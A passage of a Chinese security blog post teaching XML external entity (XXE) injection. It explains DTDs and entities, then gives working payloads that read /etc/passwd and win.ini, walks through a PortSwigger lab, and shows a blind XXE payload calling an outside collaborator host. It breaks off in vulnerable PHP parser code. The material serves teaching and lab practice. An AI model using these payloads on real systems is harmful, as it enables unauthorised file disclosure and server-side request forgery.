@@ -1,0 +1,1140 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="且将新火试新茶，诗酒趁年华">
+    <meta name="author" content="Drunkbaby">
+    
+    <title>
+        
+            从0到1完全掌握XXE |
+        
+        Drunkbaby&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="https://github.com/Drun1baby/CVE_Pentest/blob/main/%E5%8F%8B%E9%93%BEimages/favicon.png">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"drun1baby.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066cc","logo":"https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png","favicon":"https://github.com/Drun1baby/CVE_Pentest/blob/main/%E5%8F%8B%E9%93%BEimages/favicon.png","avatar":"/images/avatar.svg","font_size":"16px","font_family":null,"hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"且将新火试新茶，诗酒趁年华","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":false}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":false},"comment":{"enable":true,"use":"valine","valine":{"enable":true,"appid":"mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va","appkey":"ermlV1eoB1YODT088EdXjo6C","placeholder":"just go go","background":"/images/comment_bg.png","count":true},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"version":"3.6.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+               Drunkbaby&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                友链
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">友链</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">从0到1完全掌握XXE</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/avatar.svg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">Drunkbaby</span>
+                            
+                                <span class="author-label">Lv6</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2022-04-19 15:08:09</span>
+        <span class="mobile">2022-04-19 15:08</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2022-09-18 17:28:09</span>
+    </span>
+    
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E4%BB%8E0%E5%88%B01/">从0到1</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E4%BB%8E0%E5%88%B01/">从0到1</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>4.9k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>21 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                
+
+                <blockquote>
+<p>本文首发于 FreeBuf <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/330086.html">https://www.freebuf.com/articles/web/330086.html</a></p>
+</blockquote>
+<h1 id="从0到1完全掌握XXE"><a href="#从0到1完全掌握XXE" class="headerlink" title="从0到1完全掌握XXE"></a>从0到1完全掌握XXE</h1><h2 id="0x01-前置知识-XML-定义实体"><a href="#0x01-前置知识-XML-定义实体" class="headerlink" title="0x01 前置知识 XML 定义实体"></a>0x01 前置知识 XML 定义实体</h2><p>XML 实体允许定义在分析 XML 文档时将由内容替换的标记，这里我的理解就是定义变量，然后赋值的意思一致。就比如一些文件上传的 payload 中就会有。</p>
+<p>XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的，他就是长得下面这个样子</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>//这一行是 XML 文档定义
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!DOCTYPE</span> <span class="token attr-name">message</span> <span class="token attr-name">[</span>
+<span class="token attr-name">&lt;!ELEMENT</span> <span class="token attr-name">message</span> <span class="token attr-name">(receiver</span> <span class="token attr-name">,sender</span> <span class="token attr-name">,header</span> <span class="token attr-name">,msg)</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">receiver</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">sender</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">header</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">msg</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>上面这个 DTD 就定义了 XML 的根元素是 message，然后跟元素下面有一些子元素，那么 XML 到时候必须像下面这么写</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>message</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>receiver</span><span class="token punctuation">></span></span>Myself<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>receiver</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sender</span><span class="token punctuation">></span></span>Someone<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sender</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>header</span><span class="token punctuation">></span></span>TheReminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>header</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>msg</span><span class="token punctuation">></span></span>This is an amazing book<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>msg</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>message</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>而我们必须在 DTD 中创建一个实体，DTD 也就是定义文档类型的文件，一般来说都有 <code>&lt;!DOCTYPE</code> 这种字样。</p>
+<img src="/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/xxe-parser.png" class="">
+
+<p>一旦解析器处理了 XML 文档，它将用定义的常量“Jo Smith”替换定义的实体 <code>&amp;js</code></p>
+<p>大多数情况下，框架会根据 xml 结构自动填充 Java 对象。</p>
+<img src="/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/xxe-parser-java.png" class="">
+
+<p>通俗一点自己写一段代码的话</p>
+<p><strong>示例代码：</strong></p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="ISO-8859-1"?></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">foo</span> <span class="token punctuation">[</span><span class="token internal-subset">
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">foo</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">xxe</span> <span class="token attr-name">"test"</span> <span class="token punctuation">></span></span></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里 定义元素为 ANY 说明接受任何元素，但是定义了一个 xml 的实体（这是我们在这篇文章中第一次看到实体的真面目，实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用），那么 XML 就可以写成这样</p>
+<p><strong>示例代码：</strong></p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>creds</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pass</span><span class="token punctuation">></span></span>mypass<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pass</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>creds</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我们使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 “test” 替换。</p>
+<h2 id="0x02-什么是-XXE"><a href="#0x02-什么是-XXE" class="headerlink" title="0x02 什么是 XXE"></a>0x02 什么是 XXE</h2><blockquote>
+<p>个人认为，XXE 可以归结为一句话：构造恶意 DTD</p>
+</blockquote>
+<p>介绍 XXE 之前，我先来说一下普通的 XML 注入，这个的利用面比较狭窄，如果有的话应该也是逻辑漏洞。</p>
+<img src="/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/EasyXML.png" class="">
+
+<p>既然能插入 XML 代码，那我们肯定不能善罢甘休，我们需要更多，于是出现了 XXE。</p>
+<p>XML 外部实体注入，全称为 XML external entity injection，某些应用程序允许 XML 格式的数据输入和解析，可以通过引入外部实体的方式进行攻击。</p>
+<p>我们之前在 <code>0x01</code> 当中所讲的例子均为内部实体，但是实体实际上可以从外部的 dtd 文件中引用，我们看下面的代码：<br><strong>示例代码：</strong></p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="ISO-8859-1"?></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">foo</span> <span class="token punctuation">[</span><span class="token internal-subset">
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">foo</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>
+&lt;!ENTITY xxe SYSTEM "file:///c:/test.dtd" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>creds</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pass</span><span class="token punctuation">></span></span>mypass<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pass</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>creds</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这样对引用资源所做的任何更改都会在文档中自动更新,非常方便（<strong>方便永远是安全的敌人</strong>）</p>
+<p>当然，还有一种引用方式是使用 引用<strong>公用 DTD</strong> 的方法，语法如下：</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">根元素名称</span> <span class="token name">PUBLIC</span> <span class="token name">“DTD标识名”</span> <span class="token name">“公用DTD的URI”</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>这个在我们的攻击中也可以起到和 SYSTEM 一样的作用</p>
+<p><strong>重点二：</strong></p>
+<p>我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体），别晕。。</p>
+<p><strong>1.通用实体</strong></p>
+<p>用 &amp;实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用</p>
+<p><strong>示例代码：</strong></p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> 
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">updateProfile</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY file SYSTEM "file:///c:/windows/win.ini"> </span><span class="token punctuation">]</span><span class="token punctuation">></span></span> 
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updateProfile</span><span class="token punctuation">></span></span>  
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>firstname</span><span class="token punctuation">></span></span>Joe<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>firstname</span><span class="token punctuation">></span></span>  
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lastname</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lastname</span><span class="token punctuation">></span></span>  
+    ... 
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updateProfile</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>2.参数实体：</strong></p>
+<p>(1)使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong><br>(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>(3)和通用实体一样，参数实体也可以外部引用</p>
+<p><strong>示例代码：</strong></p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">an-element</span> <span class="token attr-name">"&lt;!ELEMENT</span> <span class="token attr-name">mytag</span> <span class="token attr-name">(subtag)</span><span class="token punctuation">></span></span>"> 
+&lt;!ENTITY % remote-dtd SYSTEM "http://somewhere.example.org/remote.dtd"> 
+%an-element; %remote-dtd;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>参数实体在我们 Blind XXE 中起到了至关重要的作用</p>
+<h2 id="0x03-XXE-的危害"><a href="#0x03-XXE-的危害" class="headerlink" title="0x03 XXE 的危害"></a>0x03 XXE 的危害</h2><ul>
+<li>1.像上文那个 file:&#x2F;&#x2F;xxx 的，很明显可以造成敏感数据泄露。</li>
+<li>2.可以利用 XXE 执行 SSRF 攻击。</li>
+<li>3.利用盲 XXE 将泄露数据外带；通过报错信息检索数据。</li>
+<li>4.XXE 与文件上传结合，造成 getshell。</li>
+</ul>
+<blockquote>
+<p>我们后续慢慢看 XXE 的危害。</p>
+</blockquote>
+<h2 id="0x04-XXE-几种攻击方式学习"><a href="#0x04-XXE-几种攻击方式学习" class="headerlink" title="0x04 XXE 几种攻击方式学习"></a>0x04 XXE 几种攻击方式学习</h2><h3 id="1-通过-File-协议进行文件读取"><a href="#1-通过-File-协议进行文件读取" class="headerlink" title="1. 通过 File 协议进行文件读取"></a>1. 通过 File 协议进行文件读取</h3><p><strong>示例代码：</strong></p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span> 
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">updateProfile</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY file SYSTEM "file:///c:/windows/win.ini"> </span><span class="token punctuation">]</span><span class="token punctuation">></span></span> 
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>updateProfile</span><span class="token punctuation">></span></span>  
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>firstname</span><span class="token punctuation">></span></span>Joe<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>firstname</span><span class="token punctuation">></span></span>  
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lastname</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lastname</span><span class="token punctuation">></span></span>  
+    ... 
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>updateProfile</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这里的 firstname 以及 lastname 都是在 XML 文件中解析的，我们尝试自己构造 payload 的话可以是这样</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version='1.0'?></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">any</span><span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY test SYSTEM "file:///etc/passwd"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>comment</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&test;">&amp;test;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>comment</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>test -&gt; “file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd” 通俗易懂</p>
+<p>我们依靠一道靶场来加强一下感受</p>
+<blockquote>
+<h5 id="Lab-Exploiting-XXE-using-external-entities-to-retrieve-files"><a href="#Lab-Exploiting-XXE-using-external-entities-to-retrieve-files" class="headerlink" title="Lab: Exploiting XXE using external entities to retrieve files"></a><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files">Lab: Exploiting XXE using external entities to retrieve files</a></h5></blockquote>
+<ul>
+<li>题意：通过 XXE 注入爆出 <code>/etc/passwd</code> 的内容</li>
+</ul>
+<p>进入靶场之后，先点击任意一个商品 - “view details”，再 Check stock 并抓包。</p>
+<p>这里的 productId 以及 storeId 是通过 XML 的形式传进来的，尝试通过 File 协议进行文件读取</p>
+<img src="/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/FileXXE.png" class="">
+
+<p>payload：</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version='1.0'?></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">any</span><span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY test SYSTEM "file:///etc/passwd"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stockCheck</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>productId</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&test;">&amp;test;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>productId</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>storeId</span><span class="token punctuation">></span></span>
+4
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>storeId</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stockCheck</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/SuccFileXXE.png" class="">
+
+<p>至于为什么会产生这个漏洞，如果想学习代码审计的师傅可以移步至我博客细究一下 <a target="_blank" rel="noopener" href="https://withd-raw.github.io/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/">代码审计XXE注入 | 芜风</a></p>
+<h3 id="2-XXE-盲注"><a href="#2-XXE-盲注" class="headerlink" title="2. XXE 盲注"></a>2. XXE 盲注</h3><ul>
+<li>所谓盲注，就是无回显</li>
+</ul>
+<p>XXE 盲注的一般思路，需要使用第三方平台协助攻击。</p>
+<h4 id="1-基本盲注"><a href="#1-基本盲注" class="headerlink" title="(1) 基本盲注"></a>(1) 基本盲注</h4><p>以 Port 靶场为例。</p>
+<blockquote>
+<h5 id="Lab-Blind-XXE-with-out-of-band-interaction-via-XML-parameter-entities"><a href="#Lab-Blind-XXE-with-out-of-band-interaction-via-XML-parameter-entities" class="headerlink" title="Lab: Blind XXE with out-of-band interaction via XML parameter entities"></a>Lab: Blind XXE with out-of-band interaction via XML parameter entities</h5></blockquote>
+<p>payload：</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">stockCheck</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY % xxe SYSTEM "http://d0eh504fzx1hdqnbch9xrbfe056vuk.burpcollaborator.net"> %xxe; </span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>stockCheck</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>productId</span><span class="token punctuation">></span></span>
+        <span class="token entity named-entity" title="&xxe;">&amp;xxe;</span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>productId</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>storeId</span><span class="token punctuation">></span></span>
+        1
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>storeId</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>stockCheck</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/2022/04/19/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1XXE/Out-of-band.png" class="">
+
+<h4 id="2-多个-DTD-的调用攻击"><a href="#2-多个-DTD-的调用攻击" class="headerlink" title="(2) 多个 DTD 的调用攻击"></a>(2) 多个 DTD 的调用攻击</h4><p>这里以 PHP 代码为例进行说明</p>
+<p>xml.php</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token function">libxml_disable_entity_loader</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
